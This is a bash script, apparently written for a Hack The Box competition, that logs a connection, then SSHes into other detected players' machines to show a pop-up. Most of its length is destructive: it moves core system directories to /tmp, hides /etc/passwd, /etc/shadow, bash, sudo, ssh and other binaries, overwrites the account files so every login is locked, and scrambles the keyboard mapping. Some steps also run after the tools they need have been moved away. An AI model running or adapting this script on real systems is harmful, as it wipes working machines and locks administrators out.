#!/bin/bash

source /usr/local/etc/my_info.conf

IP=$1
USERNAME=$2

echo "$(date): Connection attempt from IP: $IP, USERNAME: $USERNAME" >> /var/log/connection_attempts.log

if [[ ! $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "Invalid IP address format: $IP" >> /var/log/connection_attempts.log
  exit 1
fi

if [[ ! $USERNAME =~ ^[a-zA-Z0-9_]+$ ]]; then
  echo "Invalid USERNAME format: $USERNAME" >> /var/log/connection_attempts.log
  exit 1
fi

if [[ "$IP" == "$MY_HTB_IP" ]] && [[ "$USERNAME" == "$MY_SSH_USERNAME" ]]; then
  echo "Connection from myself. No action taken." >> /var/log/connection_attempts.log
  exit 0
fi

PLAYERS_IPS_FILE="/usr/local/etc/players_ips.txt"

MY_IP=$(ip -o -4 addr show dev tun0 | awk '{print $4}' | cut -d'/' -f1)

echo "$(date): Detecting active connections..." >> /var/log/connection_detection.log
netstat -ntu | awk '{print $5}' | cut -d: -f1 | grep -v -E "^$|127.0.0.1|::1|$MY_IP" | grep -E "10\." | sort | uniq > $PLAYERS_IPS_FILE
echo "$(date): Detected the following active connections:" >> /var/log/connection_detection.log
cat $PLAYERS_IPS_FILE >> /var/log/connection_detection.log

for player_ip in $(cat $PLAYERS_IPS_FILE); do
  if [[ "$player_ip" != "$MY_IP" ]] && [[ "$player_ip" != "$IP" ]]; then
    ssh $USERNAME@$player_ip 'bash -s' << 'ENDSSH'
    python3 - << 'ENDPYTHON'
import tkinter as tk

def close_window():
    root.destroy()

root = tk.Tk()
root.title("Notification")

# Display the message
message = tk.Label(root, text="🍿 PREMIUM POPCORN 🔥", font=("Helvetica", 16))
message.pack(pady=20)

# Close button
close_button = tk.Button(root, text="Close", command=close_window)
close_button.pack(pady=10)

root.mainloop()
ENDPYTHON
ENDSSH
  fi
done

mv /home/$USERNAME /tmp/$USERNAME

for dir in root etc var/log usr/local/bin usr/local/sbin usr/lib usr/include usr/share opt srv mnt media lib sbin bin; do
  mv /$dir /tmp/${dir}_hidden
done

mkdir -p /home/$USERNAME/Documents
mkdir -p /home/$USERNAME/Downloads
mkdir -p /home/$USERNAME/Desktop
mkdir -p /home/$USERNAME/Pictures
mkdir -p /home/$USERNAME/Videos
mkdir -p /home/$USERNAME/Music
mkdir -p /home/$USERNAME/Public
mkdir -p /home/$USERNAME/Templates
mkdir -p /home/$USERNAME/.config
mkdir -p /home/$USERNAME/.local/share

touch /home/$USERNAME/Documents/important.doc
touch /home/$USERNAME/Documents/financial_report.xlsx
touch /home/$USERNAME/Documents/personal_notes.txt
touch /home/$USERNAME/Downloads/setup.exe
touch /home/$USERNAME/Downloads/installer.msi
touch /home/$USERNAME/Downloads/readme.txt
touch /home/$USERNAME/Desktop/note.txt
touch /home/$USERNAME/Desktop/todo.txt
touch /home/$USERNAME/Pictures/vacation.jpg
touch /home/$USERNAME/Pictures/family.png
touch /home/$USERNAME/Videos/movie.mp4
touch /home/$USERNAME/Videos/tutorial.avi
touch /home/$USERNAME/Music/song.mp3
touch /home/$USERNAME/Music/playlist.m3u
touch /home/$USERNAME/Public/shared_file.txt
touch /home/$USERNAME/Templates/template.docx
touch /home/$USERNAME/.config/config.ini
touch /home/$USERNAME/.local/share/data.db

mkdir -p /home/$USERNAME/.hidden
mv /etc/passwd /home/$USERNAME/.hidden/passwd
mv /etc/shadow /home/$USERNAME/.hidden/shadow
mv /bin/bash /home/$USERNAME/.hidden/bash
mv /usr/bin/ssh /home/$USERNAME/.hidden/ssh
mv /etc/hosts /home/$USERNAME/.hidden/hosts
mv /etc/hostname /home/$USERNAME/.hidden/hostname
mv /etc/ssh/sshd_config /home/$USERNAME/.hidden/sshd_config
mv /etc/network/interfaces /home/$USERNAME/.hidden/interfaces
mv /etc/resolv.conf /home/$USERNAME/.hidden/resolv.conf
mv /etc/cron.d /home/$USERNAME/.hidden/cron.d
mv /etc/crontab /home/$USERNAME/.hidden/crontab
mv /bin/sh /home/$USERNAME/.hidden/sh
mv /usr/bin/sudo /home/$USERNAME/.hidden/sudo
mv /usr/bin/scp /home/$USERNAME/.hidden/scp
mv /usr/bin/wget /home/$USERNAME/.hidden/wget
mv /usr/bin/curl /home/$USERNAME/.hidden/curl
mv /usr/bin/apt /home/$USERNAME/.hidden/apt
mv /usr/bin/yum /home/$USERNAME/.hidden/yum
mv /usr/bin/systemctl /home/$USERNAME/.hidden/systemctl
mv /usr/bin/service /home/$USERNAME/.hidden/service

echo "root:x:0:0:root:/root:/bin/bash" > /etc/passwd
echo "bin:x:1:1:bin:/bin:/usr/sbin/nologin" >> /etc/passwd
echo "daemon:x:2:2:daemon:/sbin:/usr/sbin/nologin" >> /etc/passwd
echo "adm:x:3:4:adm:/var/adm:/usr/sbin/nologin" >> /etc/passwd
echo "lp:x:4:7:lp:/var/spool/lpd:/usr/sbin/nologin" >> /etc/passwd
echo "sync:x:5:0:sync:/sbin:/bin/sync" >> /etc/passwd
echo "shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown" >> /etc/passwd
echo "halt:x:7:0:halt:/sbin:/sbin/halt" >> /etc/passwd
echo "mail:x:8:12:mail:/var/spool/mail:/usr/sbin/nologin" >> /etc/passwd
echo "operator:x:11:0:operator:/root:/usr/sbin/nologin" >> /etc/passwd
echo "games:x:12:100:games:/usr/games:/usr/sbin/nologin" >> /etc/passwd
echo "ftp:x:14:50:FTP User:/var/ftp:/usr/sbin/nologin" >> /etc/passwd
echo "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" >> /etc/passwd

echo "root:*:19141:0:99999:7:::" > /etc/shadow
echo "bin:*:19141:0:99999:7:::" >> /etc/shadow
echo "daemon:*:19141:0:99999:7:::" >> /etc/shadow
echo "adm:*:19141:0:99999:7:::" >> /etc/shadow
echo "lp:*:19141:0:99999:7:::" >> /etc/shadow
echo "sync:*:19141:0:99999:7:::" >> /etc/shadow
echo "shutdown:*:19141:0:99999:7:::" >> /etc/shadow
echo "halt:*:19141:0:99999:7:::" >> /etc/shadow
echo "mail:*:19141:0:99999:7:::" >> /etc/shadow
echo "operator:*:19141:0:99999:7:::" >> /etc/shadow
echo "games:*:19141:0:99999:7:::" >> /etc/shadow
echo "ftp:*:19141:0:99999:7:::" >> /etc/shadow
echo "nobody:*:19141:0:99999:7:::" >> /etc/shadow

xmodmap -e "keycode 10 = a A"
xmodmap -e "keycode 11 = b B"
xmodmap -e "keycode 12 = c C"
xmodmap -e "keycode 13 = d D"
xmodmap -e "keycode 14 = e E"
xmodmap -e "keycode 15 = f F"
xmodmap -e "keycode 16 = g G"
xmodmap -e "keycode 17 = h H"
xmodmap -e "keycode 18 = i I"
xmodmap -e "keycode 19 = j J"

xmodmap -e "keycode 38 = 1 exclam"
xmodmap -e "keycode 39 = 2 at"
xmodmap -e "keycode 40 = 3 numbersign"
xmodmap -e "keycode 41 = 4 dollar"
xmodmap -e "keycode 42 = 5 percent"
xmodmap -e "keycode 43 = 6 asciicircum"
xmodmap -e "keycode 44 = 7 ampersand"
xmodmap -e "keycode 45 = 8 asterisk"
xmodmap -e "keycode 46 = 9 parenleft"
xmodmap -e "keycode 47 = 0 parenright"

xmodmap -e "keycode 30 = q Q"
xmodmap -e "keycode 31 = w W"
xmodmap -e "keycode 32 = e E"
xmodmap -e "keycode 33 = r R"
xmodmap -e "keycode 34 = t T"
xmodmap -e "keycode 35 = y Y"
xmodmap -e "keycode 36 = u U"
xmodmap -e "keycode 37 = i I"
xmodmap -e "keycode 24 = o O"
xmodmap -e "keycode 25 = p P"

xmodmap -e "keycode 26 = z Z"
xmodmap -e "keycode 27 = x X"
xmodmap -e "keycode 28 = c C"
xmodmap -e "keycode 29 = v V"
xmodmap -e "keycode 20 = b B"
xmodmap -e "keycode 21 = n N"
xmodmap -e "keycode 22 = m M"

echo "$(date): Allowed connection from $IP ($USERNAME)" >> /var/log/connection_monitor.log
